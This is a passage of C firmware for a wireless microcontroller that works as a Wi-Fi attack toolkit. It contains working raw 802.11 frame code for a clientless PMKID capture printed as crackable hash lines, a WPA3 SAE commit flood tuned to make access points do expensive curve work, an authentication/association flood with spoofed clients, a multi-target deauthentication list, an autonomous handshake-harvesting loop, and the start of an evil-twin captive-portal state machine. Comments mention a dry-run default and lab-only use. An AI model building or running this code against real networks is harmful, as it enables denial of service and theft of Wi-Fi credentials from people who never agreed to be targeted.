  if (len < 34 || ((buf[0] >> 2) & 3) != 2) return;   // data frames only
  if ((buf[30] == 0x88 && buf[31] == 0x8e) || (buf[32] == 0x88 && buf[33] == 0x8e)) cl_eapol++;
  pmkid_handle(buf, len);
}

static void pmkid_stream(int ch) {
  uint8_t pn = PMKN_LOAD();
  for (uint8_t i = 0; i < pn; i++) {
    pmkid_t* p = &pmkids[i];
    char ap[13], sta[13], pm[33];
    hex12(p->ap, ap);
    hex12(p->sta, sta);
    for (int k = 0; k < 16; k++) snprintf(pm + k*2, 3, "%02x", p->pmkid[k]);
    String ssid = "";
    for (unsigned j = 0; j < scan_results.size(); j++)
      if (!memcmp(scan_results[j].bssid, p->ap, 6)) { ssid = scan_results[j].ssid; break; }
    if (ssid.length() > 0) {
      String sh = "";
      for (unsigned k = 0; k < ssid.length(); k++) { char b[3]; snprintf(b, 3, "%02x", (uint8_t)ssid[k]); sh += b; }
      String line = "WPA*01*" + String(pm) + "*" + String(ap) + "*" + String(sta) + "*" + sh + "***";
      Serial.println(line); Serial1.println(line);
    } else {
      String line = "PMKID:" + String(ap) + "|" + String(sta) + "|" + String(pm);
      Serial.println(line); Serial1.println(line);
    }
  }
  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)PMKN_LOAD());
  Serial.println(fin); Serial1.println(fin);
}

// P6 clientless PMKID: raw open-auth + WPA2-PSK assoc to make the AP start the 4-way and
// replay M1 (with the PMKID), then capture it from promisc. No client needed. The SSID is
// required — many APs reject assoc with an empty/wrong SSID.
static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
  wext_set_channel(WLAN0_NAME, ch);
  char macstr[20] = {0};
  wifi_get_mac_address(macstr);            // returns "AA:BB:CC:DD:EE:FF" as a string
  uint8_t sta[6];
  for(int i = 0; i < 6; i++) sta[i] = (uint8_t)strtoul(macstr + i * 3, NULL, 16);
  // Authentication (open system, seq 1)
  uint8_t auth[30];
  memset(auth, 0, sizeof(auth));
  auth[0] = 0xB0;
  memcpy(auth + 4, bssid, 6);
  memcpy(auth + 10, sta, 6);
  memcpy(auth + 16, bssid, 6);
  // The management header is 24 bytes, so the auth body starts at 24: algorithm (u16 LE) at 24,
  // transaction sequence at 26, status at 28. Writing them at 26/28 left the sequence zero and put
  // the value in the status field, which an AP rejects.
  auth[24] = 0x00; auth[25] = 0x00;   // auth algorithm: open system
  auth[26] = 0x01; auth[27] = 0x00;   // auth transaction sequence: 1
  auth[28] = 0x00; auth[29] = 0x00;   // status: 0
  wifi_tx_raw_frame(auth, 30);
  delay(30);
  // Association request (ESS + Privacy, SSID + rates + RSN WPA2-PSK/CCMP)
  uint8_t f[256];
  int n = 0;
  f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;
  memcpy(f + n, bssid, 6); n += 6;
  memcpy(f + n, sta, 6);   n += 6;
  memcpy(f + n, bssid, 6); n += 6;
  f[n++] = 0x00; f[n++] = 0x00;   // seq (set automatically)
  f[n++] = 0x11; f[n++] = 0x04;   // capability: ESS | Privacy
  f[n++] = 0x0A; f[n++] = 0x00;   // listen interval
  int sl = strlen(ssid);
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;
  memcpy(f + n, ssid, sl); n += sl;
  f[n++] = 0x01; f[n++] = 0x08;
  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
  f[n++] = 0x32; f[n++] = 0x04;
  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22; }
  wifi_tx_raw_frame(f, n);
}

// --- Raw-TX channel guard ---------------------------------------------------------------
// The only real restriction is DFS: 52-140 are radar channels and must not be used for TX.
//
// An earlier version of this guard refused EVERY channel above 14, because pointing a flood at a
// 5 GHz AP appeared to wedge the board. That conclusion was wrong. The wedge came from the old
// "tune once, then send N frames" pattern: the tuning does not survive between raw frames, and the
// SDK then spins forever inside its TX path (exactly the pitfall noted above tx_beacon_raw()).
// Measured after moving the tune inside the loop: 64 beacons on channel 36 complete and the board
// stays up, so 5 GHz raw TX works and 5 GHz targets are allowed.
static bool tx_raw_chan_ok(int ch, const char* who) {
  if(is_valid_tx_channel(ch)) return true;
  String r = String("ERROR: ") + who + " refused: channel " + String(ch) +
             (is_dfs_channel(ch) ? " is DFS (radar, RX only)" : " is not 1-14 / 36-48 / 149-165");
  Serial.println(r); Serial1.println(r);
  return false;
}

// --- B4: SAE commit flood (WPA3 denial of service) --------------------------------------
// WPA3 replaces the WPA2 4-way with SAE (Dragonfly). When an AP receives an Authentication frame
// with algorithm 3 (SAE) and sequence 1 (Commit), it must run an elliptic-curve operation on the
// scalar and element the frame carries *before* it can decide they are invalid. So a stream of
// commits from many different source MACs keeps the AP's CPU busy validating points that never
// belonged to anybody - the "dragonblood" denial of service. The values here are random on
// purpose: they are invalid, and that is fine, because the expensive part happens first.
//
// Layout (IEEE 802.11-2016, 9.4.1.1 - Authentication, algorithm 3):
//   auth algorithm (2, LE = 3) | auth sequence (2, LE = 1) | status code (2) |
//   SAE Commit: group id (2, LE) | scalar | element
// Group 19 (NIST P-256, the WPA3 default) is 32 + 64 bytes, which is what every consumer AP uses;
// group 20 (P-384, 48 + 96) does not fit tx_stage, so it is deliberately not offered.
// Args: SAEFLOOD <bssid-12hex> <chan> [count]
#define SAE_GROUP_P256 19
static void sae_send_commit(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[144];
  int n = 0;
  f[n++] = 0xB0; f[n++] = 0x00;           // frame control: authentication
  f[n++] = 0x00; f[n++] = 0x00;           // duration
  memcpy(f + n, bssid, 6); n += 6;        // addr1: the AP
  memcpy(f + n, sta, 6); n += 6;          // addr2: the spoofed client
  memcpy(f + n, bssid, 6); n += 6;        // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;           // sequence (driver fills it)
  f[n++] = 0x03; f[n++] = 0x00;           // auth algorithm: SAE
  f[n++] = 0x01; f[n++] = 0x00;           // auth sequence: 1 = commit
  f[n++] = 0x00; f[n++] = 0x00;           // status code: success
  f[n++] = SAE_GROUP_P256; f[n++] = 0x00; // group id: NIST P-256
  // Scalar: random on every frame, so each one costs the AP a different computation.
  for(int i = 0; i < 32; i++) f[n++] = (uint8_t)random(0, 256);
  // Element: the P-256 BASE POINT, i.e. deliberately a valid point. The order matters and it is
  // easy to get wrong: an AP validates the element (on-curve check) BEFORE it derives the shared
  // secret (IEEE 802.11-2016 12.4.5.4; hostapd sae_parse_commit_element_ecc() ->
  // crypto_ec_point_is_on_curve() -> only then sae_process_commit()). A random element is almost
  // certainly off the curve, so it would be rejected cheaply and the flood would cost the AP
  // nothing. With a valid point the AP goes on to the scalar multiplication - the expensive half -
  // and then keeps its SAE state waiting for a confirm that never arrives.
  // The base point is public and fixed (NIST P-256 G, FIPS 186-4 / RFC 5903 3.2.1).
  static const uint8_t gx[32] = {
      0x6B,0x17,0xD1,0xF2,0xE1,0x2C,0x42,0x47,0xF8,0xBC,0xE6,0xE5,0x63,0xA4,0x40,0xF2,
      0x77,0x03,0x7D,0x81,0x2D,0xEB,0x33,0xA0,0xF4,0xA1,0x39,0x45,0xD8,0x98,0xC2,0x96};
  static const uint8_t gy[32] = {
      0x4F,0xE3,0x42,0xE2,0xFE,0x1A,0x7F,0x9B,0x8E,0xE7,0xEB,0x4A,0x7C,0x0F,0x9E,0x16,
      0x2B,0xCE,0x33,0x57,0x6B,0x31,0x5E,0xCE,0xCB,0xB6,0x40,0x68,0x37,0xBF,0x51,0xF5};
  memcpy(f + n, gx, 32); n += 32;
  memcpy(f + n, gy, 32); n += 32;
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

// --- B5: authentication / association flood --------------------------------------------
// An AP reserves state for every client that starts associating (an association-table slot), and
// that slot is only freed when the entry times out or the client leaves. Blasting authentication
// requests with random source MACs fills the table with clients that do not exist, so the AP has
// no room (or no CPU) for its real ones until they expire. Association requests go further: many
// APs allocate an AID before checking that the authentication really happened, and the null-data
// frame with the power-management bit set then tells the AP the fake client is dozing, which is
// what keeps its entry from being reaped. Only the AP is addressed - no frames go to any client.
// (Auth body layout: algorithm 0x0000 = open system at 24, transaction sequence 1 at 26, status 0
// at 28 - the fields start immediately after the 24-byte management header.)
static uint8_t flood_sta[6];

static void flood_mac_rand(void) {
  for(int i = 0; i < 6; i++) flood_sta[i] = (uint8_t)random(0, 256);
  flood_sta[0] = (uint8_t)((flood_sta[0] & 0xFC) | 0x02);   // unicast + locally administered
}

static void flood_tx_auth(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[30];
  memset(f, 0, sizeof(f));
  f[0] = 0xB0; f[1] = 0x00;                 // frame control: authentication
  memcpy(f + 4, bssid, 6);                  // addr1: the AP
  memcpy(f + 10, sta, 6);                   // addr2: the spoofed client
  memcpy(f + 16, bssid, 6);                 // addr3: BSSID
  f[24] = 0x00; f[25] = 0x00;               // auth algorithm: open system
  f[26] = 0x01; f[27] = 0x00;               // auth transaction sequence: 1
  f[28] = 0x00; f[29] = 0x00;               // status: 0
  wifi_tx_raw_frame(f, 30);
}

static void flood_tx_assoc(const uint8_t* bssid, const uint8_t* sta, const char* ssid) {
  uint8_t f[192];
  int n = 0;
  f[n++] = 0x00; f[n++] = 0x00;             // frame control: association request
  f[n++] = 0x00; f[n++] = 0x00;             // duration
  memcpy(f + n, bssid, 6); n += 6;          // addr1: the AP
  memcpy(f + n, sta, 6); n += 6;            // addr2: the spoofed client
  memcpy(f + n, bssid, 6); n += 6;          // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;             // sequence (driver fills it)
  f[n++] = 0x11; f[n++] = 0x04;             // capability: ESS | Privacy
  f[n++] = 0x0A; f[n++] = 0x00;             // listen interval
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;      // SSID element
  memcpy(f + n, ssid, sl); n += sl;
  f[n++] = 0x01; f[n++] = 0x08;             // supported rates
  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
  f[n++] = 0x32; f[n++] = 0x04;             // extended supported rates
  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22; }
  wifi_tx_raw_frame(f, n);
}

// Null data frame with the power-management bit set: "I am going to sleep". An AP keeps the
// table entry of a dozing client instead of reaping it, so the flood's entries survive longer.
static void flood_tx_sleep(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[24];
  memset(f, 0, sizeof(f));
  f[0] = 0x48; f[1] = 0x10;                 // frame control: null data, PM bit set
  memcpy(f + 4, bssid, 6);
  memcpy(f + 10, sta, 6);
  memcpy(f + 16, bssid, 6);
  wifi_tx_raw_frame(f, 24);
}

// The target's SSID from the last SCAN - many APs reject an association with an empty/wrong SSID.
static String flood_ssid_for(const uint8_t* bssid) {
  for(unsigned j = 0; j < scan_results.size(); j++)
    if(!memcmp(scan_results[j].bssid, bssid, 6)) return scan_results[j].ssid;
  return String("");
}

// --- A: HELLO/IDENT handshake + capability advertisement ----------------------
// Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
// caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
// Ours on top: L=ble I=iBeacon C=BLE adv K=KARMA R=responder T=btm F=auth/assoc flood
// A=sae commit flood.
// We advertise "DSEBH" (no BLE -> no L/I/C/K).
#define PETREL_FW_VERSION "1.0.0"
#define PETREL_FW_CAPS "DSEBHLICKRTFA"

// --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
#define DAUTH_MAX 8
typedef struct {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t ch;
  bool have_client;
} dauth_t;
static dauth_t dauth_list[DAUTH_MAX];
static volatile uint8_t dauth_n = 0;
static volatile bool dauth_run = false;
static uint8_t dauth_idx = 0;

// Strict MAC parsing: strtoul() alone accepted garbage and returned 0, so "ZZ:..." silently
// became 00:00:... and a short string left the tail of the destination stale.
static bool hex2(const char* s, uint8_t* out) {
  int hi = hexnib(s[0]), lo = hexnib(s[1]);
  if (hi < 0 || lo < 0) return false;
  *out = (uint8_t)((hi << 4) | lo);
  return true;
}

static bool hex_to_mac(const String& h, uint8_t* out) {   // "aabbccddeeff"
  if (h.length() != 12) return false;
  const char* p = h.c_str();
  for (int i = 0; i < 6; i++) if (!hex2(p + i * 2, out + i)) return false;
  return true;
}

// A command argument that must be a decimal index. Missing/non-numeric used to become 0, which
// silently acted on AP 0.
static bool arg_index(const String& line, int from, int* out) {
  String t = line.substring(from); t.trim();
  if (t.length() == 0 || t.length() > 4) return false;
  for (unsigned i = 0; i < t.length(); i++) if (!isdigit((unsigned char)t[i])) return false;
  *out = t.toInt();
  return true;
}

static bool parse_mac_colon(const char* s, uint8_t* out) {   // "AA:BB:CC:DD:EE:FF"
  if (strlen(s) != 17) return false;
  for (int i = 0; i < 6; i++) {
    if (!hex2(s + i * 3, out + i)) return false;
    if (i < 5 && s[i * 3 + 2] != ':') return false;
  }
  return true;
}

static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_client, uint8_t ch) {
  if (dauth_n >= DAUTH_MAX) return;
  dauth_t* t = &dauth_list[dauth_n];
  memcpy(t->bssid, bssid, 6);
  if (have_client && client) memcpy(t->client, client, 6);
  else memset(t->client, 0xFF, 6);
  t->have_client = have_client;
  t->ch = ch;
  dauth_n++;
}

// Async grab state (HSGRAB/PKGRAB). A blocking deauth burst stalls the WiFi task on
// this driver, so the deauth is driven from the main loop (same cadence as DEAUTHRUN,
// which is proven), then the state flips to promisc capture.
#define HSG_IDLE     0
#define HSG_DISCOVER 1
#define HSG_DEAUTH   2
#define HSG_CAPTURE  3
static volatile int hsg_phase = HSG_IDLE;
static volatile uint32_t hsg_t = 0;
static volatile uint32_t hsg_disc_ms = 5000;
static volatile uint32_t hsg_deauth_ms = 4000;
static volatile uint32_t hsg_cap_ms = 15000;
static volatile bool hsg_pmkid = false;
static volatile int hsg_ch = 6;
// B: async passive CAPTURE (armed by CAPTURE, finished by loop() or CAPSTOP).
static bool cap_active = false;   // cross-task: atomic accessors below
#define CAP_ON()   __atomic_load_n(&cap_active, __ATOMIC_ACQUIRE)
#define CAP_SET(v) __atomic_store_n(&cap_active, (v), __ATOMIC_RELEASE)
static volatile uint32_t cap_deadline = 0;
static volatile int cap_ch = 6;

// M2: shared grab-arming seam. HSGRAB/PKGRAB and the autonomous harvest FSM all start a grab
// through here (discover STAs -> deauth -> capture), so there is ONE arming path. `dry` skips the
// deauth TX in HSG_DEAUTH (DISCOVER + CAPTURE stay live and passive) so the full loop can be
// verified without transmitting any attack frame; a dry grab yields HSDONE:0 (no deauth -> no
// forced reconnect -> no EAPOL), which is the correct proof, not a bug.
static volatile bool hsg_dry = false;
static void hsg_start(const uint8_t* bssid, int ch, uint32_t cap_ms, bool pmkid, bool dry) {
    if (apActive) destroyAP();   // no monitor capture while the softAP runs
    // A repeated grab must not reset the buffers under the previous callback: quiesce first.
    wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
    HSCAP_SET(false);
    HSCOUNT_SET(0);
    // Discovery must look at THIS AP's stations. A leftover STASCAN filter used to restrict it to
    // the wrong AP, and no filter at all collected every AP's stations on the channel.
    memcpy(sta_filter, bssid, 6);
    STAF_SET(true);
    PMKN_SET(0);
    memcpy(hsg_bssid, bssid, 6);
    hsg_target_set = true;   // grab is pinned to this AP -> promisc callbacks filter to it
    hsg_ch = ch;
    hsg_cap_ms = cap_ms;
    hsg_pmkid = pmkid;
    hsg_dry = dry;
    STA_STORE(0);
    wext_set_channel(WLAN0_NAME, ch);
    wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
    hsg_t = millis();
    hsg_phase = HSG_DISCOVER;
}

// --- M2: autonomous harvest FSM (pwnagotchi-style) ---------------------------------------------
// Layered OVER hsg_phase: HV_SCAN -> HV_SELECT -> hsg_start(target) -> wait hsg idle -> next, for
// N targets from one scan, then stop. Single radio => mutually exclusive with scan/hop/capture/
// softAP/deauth-list (gated at arm and in the command chain). Default DRY (no deauth TX); the real
// attack needs an explicit LIVE token, so only the owner fires it (RF-isolated lab).
#define HV_IDLE   0
#define HV_SCAN   1
#define HV_SELECT 2
#define HV_GRAB   3
static volatile int hv_phase = HV_IDLE;
static volatile bool hv_dry = true;               // safe default; LIVE token overrides
static volatile int hv_targets_left = 0;
static volatile uint32_t hv_cap_ms = 12000;
#define HV_DONE_MAX 24
static uint8_t hv_done[HV_DONE_MAX][6];
static uint32_t hv_cooldown_until[HV_DONE_MAX];
static uint8_t hv_done_n = 0;
static uint32_t hv_cooldown_ms = 120000;          // don't re-harvest the same AP for 2 min
static uint8_t hv_cur_bssid[6];

static bool hv_in_cooldown(const uint8_t* bssid) {
    for (uint8_t i = 0; i < hv_done_n; i++)
        if (!memcmp(hv_done[i], bssid, 6))
            return (int32_t)(hv_cooldown_until[i] - millis()) > 0;
    return false;
}
static void hv_mark(const uint8_t* bssid) {
    for (uint8_t i = 0; i < hv_done_n; i++)
        if (!memcmp(hv_done[i], bssid, 6)) { hv_cooldown_until[i] = millis() + hv_cooldown_ms; return; }
    if (hv_done_n < HV_DONE_MAX) {
        memcpy(hv_done[hv_done_n], bssid, 6);
        hv_cooldown_until[hv_done_n] = millis() + hv_cooldown_ms;
        hv_done_n++;
    }   // full: stop tracking (those APs stay eligible) — acceptable for a bounded run
}
static void hv_stop(const char* why) {
    hv_phase = HV_IDLE;
    hv_targets_left = 0;
    if (hsg_phase != HSG_IDLE) {   // abort any in-flight grab + free the radio (mirrors STOP)
        wifi_set_promisc(0, NULL, 0);
        HSCAP_SET(false);
        hsg_phase = HSG_IDLE;
        hsg_target_set = false;
    }
    char m[48];
    snprintf(m, sizeof(m), "HARVEST:stopped %s", why ? why : "");
    Serial.println(m); Serial1.println(m);
}

// --- P8: BLE scan (AmebaBLE library) ---
#define BLE_MAX 16
static char ble_addr[BLE_MAX][20];
static char ble_name[BLE_MAX][24];
static char ble_tag[BLE_MAX][12];
static char ble_raw[BLE_MAX][64];   // raw advertising data as hex
static int8_t ble_rssi[BLE_MAX];
static uint8_t ble_n = 0;   // cross-task: atomic accessors below
#define BLEN_LOAD()  __atomic_load_n(&ble_n, __ATOMIC_ACQUIRE)
#define BLEN_SET(v)  __atomic_store_n(&ble_n, (v), __ATOMIC_RELEASE)
static BLEAdvertData ble_adv;
static BLEHIDKeyboard ble_kbd;
static BLEAdvertData ble_hidadv;

static void ble_classify(BLEAdvertData& a, char* tag, size_t cap) {
  tag[0] = '\0';
  String nm = a.getName();
  if(nm.indexOf("Flipper") >= 0) { snprintf(tag, cap, "Flipper"); return; }
  if(a.hasManufacturer()) {
    uint16_t mf = a.getManufacturer();
    if(mf == 0x004C || mf == 0x4C00) {          // Apple (FindMy trackers use type 0x12)
      uint8_t* md = a.getManufacturerData();
      uint8_t ml = a.getManufacturerDataLength();
      if(ml >= 1 && md[0] == 0x12) snprintf(tag, cap, "FindMy");
      else snprintf(tag, cap, "Apple");
    } else if(mf == 0x0006 || mf == 0x0600) {
      snprintf(tag, cap, "MS");
    } else {
      snprintf(tag, cap, "mf%04X", mf);
    }
    return;
  }
  if(nm.length() == 0) snprintf(tag, cap, "--");
}

static void ble_scan_cb(T_LE_CB_DATA* p_data) {
  ble_adv.parseScanInfo(p_data);
  BLEAddr a = ble_adv.getAddr();
  const char* as = a.str();
  char tag[12];
  ble_classify(ble_adv, tag, sizeof(tag));
  // Raw advertising data (hex) straight from the stack.
  T_LE_SCAN_INFO* si = p_data->p_le_scan_info;
  uint8_t dl = si->data_len; if(dl > 31) dl = 31;
  char raw[64]; int rp = 0;
  for(uint8_t k = 0; k < dl && rp < 60; k++) rp += snprintf(raw + rp, 3, "%02x", si->data[k]);
  raw[rp] = '\0';
  uint8_t bn = BLEN_LOAD();
  for (uint8_t i = 0; i < bn; i++) {
    if (strcmp(ble_addr[i], as) == 0) {          // already seen -> refresh name/tag/rssi/raw
      ble_rssi[i] = ble_adv.getRSSI();
      strncpy(ble_raw[i], raw, sizeof(ble_raw[0]) - 1);
      ble_raw[i][sizeof(ble_raw[0]) - 1] = '\0';
      if(ble_tag[i][0] == '\0' && tag[0]) { strncpy(ble_tag[i], tag, sizeof(ble_tag[0]) - 1); }
      if (ble_name[i][0] == '\0' && ble_adv.hasName()) {
        strncpy(ble_name[i], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
        ble_name[i][sizeof(ble_name[0]) - 1] = '\0';
      }
      return;
    }
  }
  if (bn >= BLE_MAX) return;
  snprintf(ble_addr[bn], sizeof(ble_addr[0]), "%s", as);
  ble_name[bn][0] = '\0';
  if (ble_adv.hasName()) {
    strncpy(ble_name[bn], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
    ble_name[bn][sizeof(ble_name[0]) - 1] = '\0';
  }
  strncpy(ble_tag[bn], tag, sizeof(ble_tag[0]) - 1);
  ble_tag[bn][sizeof(ble_tag[0]) - 1] = '\0';
  strncpy(ble_raw[bn], raw, sizeof(ble_raw[0]) - 1);
  ble_raw[bn][sizeof(ble_raw[0]) - 1] = '\0';
  ble_rssi[bn] = ble_adv.getRSSI();
  BLEN_SET((uint8_t)(bn + 1));   // release: record published before the count
}

static void ble_stream() {
  uint8_t bn = BLEN_LOAD();
  for (uint8_t i = 0; i < bn; i++) {
    char line[160];
    snprintf(line, sizeof(line), "BLE:%s|%d|%s|%s|%s", ble_addr[i], ble_rssi[i], ble_name[i], ble_tag[i], ble_raw[i]);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "BLEDONE: n=" + String((unsigned)bn);
  Serial.println(fin); Serial1.println(fin);
}

// ============================================================================
// D.4/2 cooperative AP lifecycle (architect's directive, codex-architect-d4b.txt)
// One apTestTick() call performs at most one state's work and returns to loop();
// USB/UART commands are serviced FIRST in every pass. The radio path never calls
// WiFi.apbegin(), wifiDriverInit() or WiFi.status(). The test AP is benign:
// 'PETRELTESTAP', channel 6, open, no impersonation, no credential collection.
// ============================================================================
extern "C" {
// The four wifi_conf.c split symbols are GONE: that file is prebuilt into lib_arduino.a and is
// never compiled from source (link map: .text.wifi_on <- lib_arduino.a(wifi_conf.o)), so the split
// cannot exist. Radio ON/OFF goes through the serialized worker below, which calls the prebuilt
// wifi_on()/wifi_off() and confirms with rltk_wlan_running() - the source's own predicate.
int petrel_ap_begin(char *ssid, unsigned char channel);
int petrel_ap_poll(const char *ssid, unsigned char channel);
void petrel_radio_cache(rtw_mode_t mode);
}

enum ApTestState : uint8_t {
    AT_IDLE = 0,
    AT_CLOSE,
    AT_QUIET,
    AT_OFF_BEGIN,
    AT_OFF_POLL,
    AT_OFF_GAP,
    AT_ON_BEGIN,
    AT_ON_POLL,
    AT_ON_GAP,
    AT_AP_BEGIN,
    AT_AP_POLL,
    AT_DHCP,
    AT_DNS,
    AT_HTTP,
    AT_READY,
    AT_FAILED
};

static ApTestState atState = AT_IDLE;
static char atSsid[33] = {0};
static uint8_t atChannel = 6;
static uint32_t atCycle = 0;
static uint32_t atSince = 0;
static uint32_t atPoll = 0;
static bool atWantStart = false;
static bool atStopRequested = false;
static bool atClean = true;
static uint8_t atFailure = 0;
static uint8_t atOffTries = 0;   // consecutive RADIO_OP_OFF submission failures (retry cap)
static rtw_mode_t atRadioTarget = RTW_MODE_STA_AP;

// ---- D.4/2 serialized radio worker (architect ruling, option A) ----
// Contract: ONE outstanding job (immutable once submitted); the completion record crosses a
// FreeRTOS queue - NO volatile-flag synchronization; the worker publishes, then deletes itself and
// never touches the radio or shared storage again; the 20s deadline is a failure deadline, never a
// cancellation; the worker must not print (loop emits every lifecycle line).
enum RadioOp : uint8_t { RADIO_OP_OFF = 0, RADIO_OP_ON = 1 };

struct RadioJob {
    uint8_t op;
    rtw_mode_t mode;
    uint32_t gen;
};

struct RadioDone {
    uint32_t gen;
    uint8_t op;
    rtw_mode_t mode;
    int16_t rc;      // the prebuilt call's own return: necessary, NOT sufficient
    uint8_t w0;      // rltk_wlan_running(WLAN0_IDX) observed AFTER the call
    uint8_t w1;      // rltk_wlan_running(WLAN1_IDX)
    uint32_t hwm;    // worker stack high-water mark (words) - headroom evidence for the cycle test
};

static QueueHandle_t radioDoneQ = NULL;
static RadioJob radioJob;          // written only in a BEGIN state (loop context)
static uint32_t radioJobGen = 0;   // the generation loop is currently waiting on
static uint32_t radioStale = 0;    // drained completions from abandoned generations

static void radioWorker(void* pv)
{
    RadioJob j = *(RadioJob*)pv;   // snapshot FIRST; never re-read shared storage after this
    RadioDone d;
    d.gen = j.gen;
    d.op = j.op;
    d.mode = j.mode;
    d.rc = (int16_t)((j.op == RADIO_OP_OFF) ? wifi_off() : wifi_on(j.mode));
    d.w0 = rltk_wlan_running(WLAN0_IDX);
    d.w1 = rltk_wlan_running(WLAN1_IDX);
    // hwm: the pinned kernel is built with INCLUDE_uxTaskGetStackHighWaterMark=0
    // (FreeRTOSConfig.h:140), so the symbol does not exist to link. Reported to the architect - the
    // headroom check is deferred, not skipped silently; the field stays for when a kernel with it
    // arrives. 0 means "not measured in this build".
    d.hwm = 0;
    xQueueSend(radioDoneQ, &d, 0); // publish; after this the worker touches nothing
    vTaskDelete(NULL);
}

// 1 = submitted, 0 = failed (queue/task creation). loop() context only.
static uint8_t radioSubmit(uint8_t op, rtw_mode_t mode)
{
    if (radioDoneQ == NULL) {
        radioDoneQ = xQueueCreate(2, sizeof(RadioDone));
        if (radioDoneQ == NULL) return 0;
    }
    RadioDone d;
    while (xQueueReceive(radioDoneQ, &d, 0) == pdTRUE) radioStale++;  // drain, never act on late work
    radioJob.op = op;
    radioJob.mode = mode;
    radioJob.gen = ++radioJobGen;
    TaskHandle_t h = NULL;
    // 2048 StackType_t words (~8 KiB) is the architect's INITIAL allocation, not a proven need.
    // The hwm-based headroom check is deferred: the pinned kernel lacks
    // uxTaskGetStackHighWaterMark (INCLUDE_...=0), so nothing can read it.
    if (xTaskCreate(radioWorker, "petrel_radio", 2048, (void*)&radioJob,
                    (UBaseType_t)uxTaskPriorityGet(NULL), &h) != pdPASS) return 0;
    return 1;
}

// Non-blocking: 0 pending, 1 confirmed, -1 failed. loop() context only; never touches the driver.
static int radioPoll(uint32_t gen)
{
    RadioDone d;
    while (xQueueReceive(radioDoneQ, &d, 0) == pdTRUE) {
        if (d.gen != gen) { radioStale++; continue; }
        // Loop emits the completion (architect: the worker never prints). Late completions are
        // emitted in the submit drain path too, so the transcript keeps the whole history.
        char line64[72];
        snprintf(line64, sizeof(line64), "RD4:%lu:%u:%d:%u:%u:%lu",
                 (unsigned long)d.gen, (unsigned)d.op, (int)d.rc,
                 (unsigned)d.w0, (unsigned)d.w1, (unsigned long)d.hwm);
        atReply(line64);
        if (d.op == RADIO_OP_OFF) {
            // Confirmed off ONLY when the call returned non-error AND both interfaces report down.
            if (d.rc >= 0 && d.w0 == 0 && d.w1 == 0) return 1;
            return -1;
        }
        // ON -> AP: WLAN0 running. ON -> STA_AP: both running (architect's table).
        uint8_t up = (uint8_t)((d.w0 ? 1 : 0) + (d.w1 ? 1 : 0));
        if (d.rc >= 0 && up >= (d.mode == RTW_MODE_STA_AP ? 2u : 1u)) return 1;
        return -1;
    }
    return 0;
}

static void atReply(const char *s)
{
    Serial.println(s);
    Serial1.println(s);
}

static void atEnter(uint8_t next)
{
    // uint8_t on purpose: the Arduino preprocessor inserts its own prototypes near the top of the
    // combined .ino, BEFORE the enum exists, and a custom type in a signature then fails to compile.
    atState = (ApTestState)next;
    atSince = millis();
    atPoll = atSince;

    char line[64];
    snprintf(line, sizeof(line), "D4:%lu:%u:%lu",
             (unsigned long)atCycle, (unsigned)next,
             (unsigned long)atSince);
    atReply(line);
}

static bool atOwned()
{
    return atState != AT_IDLE;
}

static bool atExpired(uint32_t ms)
{
    return (uint32_t)(millis() - atSince) >= ms;
}

static void atFail(uint8_t reason)
{
    atFailure = reason;
    atWantStart = false;
    atStopRequested = false;
    atEnter(AT_CLOSE);              // cleanup, then FAILED
}

static void atTerminalFailure(uint8_t reason)
{
    atFailure = reason;
    atClean = false;               // radio shutdown not confirmed
    apActive = false;
    atEnter(AT_FAILED);

    char line[48];
    snprintf(line, sizeof(line), "APTEST:FAILED:%u:RESET",
             (unsigned)reason);
    atReply(line);
}

// M3 evil-twin FSM state (declared here so atStart's busy guard can reference et_phase; the
// atStartClone/releaseRadio helpers are defined after atStop since they drive the AP lifecycle).
#define ET_IDLE    0
#define ET_DEAUTH  1   /* AP down: (LIVE) burst-deauth the real AP */
#define ET_PORTAL  2   /* AP up: clone + captive portal, dwell */
#define ET_WAITUP  3   /* LIVE: waiting for the clone AP to reach AT_READY */
#define ET_WAITDN  4   /* LIVE: waiting for AP teardown to AT_IDLE before the next deauth */
#define ET_BURST_MS     4000u    /* deauth burst before each portal window */
#define ET_DWELL_MS     10000u   /* portal dwell (clone AP up); tune burst/dwell ratio here */
